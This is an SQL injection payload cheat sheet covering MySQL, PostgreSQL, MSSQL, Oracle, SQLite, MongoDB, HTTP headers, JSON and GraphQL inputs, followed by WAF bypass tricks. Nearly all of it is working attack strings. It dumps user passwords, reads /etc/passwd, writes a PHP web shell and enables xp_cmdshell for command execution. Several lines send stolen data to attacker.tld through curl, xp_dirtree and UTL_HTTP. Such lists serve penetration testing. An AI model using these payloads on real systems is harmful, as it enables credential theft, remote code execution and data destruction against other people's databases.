# PAYLOADS: SQL Injection — All DBs
## Version: 1.0 | Domain: payloads

---

## DETECTION (DB-AGNOSTIC)
```
'
"
\
';
'/*
'%00
' OR '1
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' #
' OR '1'='1'/*
') OR ('1'='1
")) OR (("1"="1
';--
';#
' AND 1=1-- -
' AND 1=2-- -
```

## MYSQL
### Union
```
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT @@version,user(),database()-- -
' UNION SELECT GROUP_CONCAT(schema_name),NULL,NULL FROM information_schema.schemata-- -
' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT username,password,NULL FROM users-- -
```

### Time-based
```
' AND SLEEP(5)-- -
' AND IF(1=1,SLEEP(5),0)-- -
' OR (SELECT * FROM (SELECT(SLEEP(5)))a)-- -
' AND ELT(1,SLEEP(5))-- -
' AND BENCHMARK(50000000,MD5('a'))-- -
```

### Boolean
```
' AND (SELECT SUBSTR(password,1,1) FROM users LIMIT 1)='a'-- -
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>97-- -
```

### Error-based
```
' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
' AND updatexml(1,concat(0x7e,(SELECT version())),1)-- -
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)-- -
```

### File ops
```
' UNION SELECT LOAD_FILE('/etc/passwd')-- -
' UNION SELECT 'A' INTO OUTFILE '/var/www/html/x.txt'-- -
' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/s.php'-- -
```

## POSTGRESQL
```
' OR pg_sleep(5)-- -
'; SELECT pg_sleep(5)-- -
'; SELECT current_database()-- -
' UNION SELECT NULL,version(),current_user-- -
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- -
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
'; CREATE TABLE x(c text); COPY x FROM PROGRAM 'curl http://attacker.tld/$(whoami)'-- -
'; SELECT pg_read_file('/etc/passwd', 0, 1000)-- -
'; SELECT pg_ls_dir('/')-- -
';SELECT lo_import('/etc/passwd',12345); SELECT lo_export(12345,'/tmp/p.txt')-- -
```

## MSSQL
```
'; WAITFOR DELAY '0:0:5'-- -
' UNION SELECT @@version-- -
' UNION SELECT name FROM sys.databases-- -
' UNION SELECT name FROM sysobjects WHERE xtype='U'-- -
' UNION SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')-- -
'; EXEC xp_cmdshell 'whoami'-- -
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -
'; DECLARE @x VARCHAR(8000); SET @x=(SELECT TOP 1 password FROM users); EXEC('xp_dirtree "//attacker.tld/'+@x+'"')-- -
```

## ORACLE
```
' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -
' UNION SELECT banner,NULL FROM v$version-- -
' UNION SELECT table_name,NULL FROM all_tables-- -
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'-- -
' UNION SELECT username || password,NULL FROM users-- -
' OR UTL_HTTP.REQUEST('http://attacker.tld/'||(SELECT password FROM users WHERE rownum=1)) IS NOT NULL-- -
```

## SQLITE
```
' UNION SELECT NULL,sqlite_version(),NULL-- -
' UNION SELECT NULL,group_concat(tbl_name),NULL FROM sqlite_master-- -
' UNION SELECT NULL,sql,NULL FROM sqlite_master WHERE type='table'-- -
```

## NOSQL — MONGODB
```json
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":{"$gt":""},"password":{"$gt":""}}
{"$where":"this.password.length>0"}
{"username":"admin","password":{"$regex":"^a"}}
{"username":"admin","password":{"$regex":".*"}}
```

```
username[$ne]=null&password[$ne]=null              # form-data
username=admin&password[$regex]=^a                 # blind
```

## HEADERS / OTHER PARAMS
```
X-Forwarded-For: ' OR pg_sleep(5)-- -
User-Agent: ' OR pg_sleep(5)-- -
Referer: ' OR pg_sleep(5)-- -
Cookie: id=' OR pg_sleep(5)-- -
```

## JSON BODY
```json
{"sort":"id; DROP TABLE users-- -"}
{"filter":{"raw":"1=1)) UNION SELECT * FROM users-- -"}}
{"q":"' UNION SELECT password FROM users-- -"}
```

## GRAPHQL
```graphql
{ user(id:"1' UNION SELECT username,password FROM users-- -") { name } }
```

## WAF BYPASS
```
/**/UnIoN/**/SeLeCt
UN%2FION%20SELECT
%55nion%20%53elect
union%23%0aselect
union/*x*/select
+UNION+ALL+SELECT+
+UNION%20DISTINCT+SELECT+
0e%23 UNION SELECT
"0e1234"
```

```
# Comments to break keywords
UN/**/ION SE/**/LECT
SELE/*x*/CT
SE%0bLECT
SE%a0LECT
```

```
# Hex / char encoding
0x61646d696e                      → 'admin'
CHAR(97,100,109,105,110)            → 'admin'
CONCAT(CHAR(97),CHAR(100),...)
```

```
# Quote-stripping bypass (use hex)
SELECT * FROM users WHERE name=0x61646d696e
```

## REFERENCES
PortSwigger SQLi cheat sheet, sqlmap docs, PayloadsAllTheThings
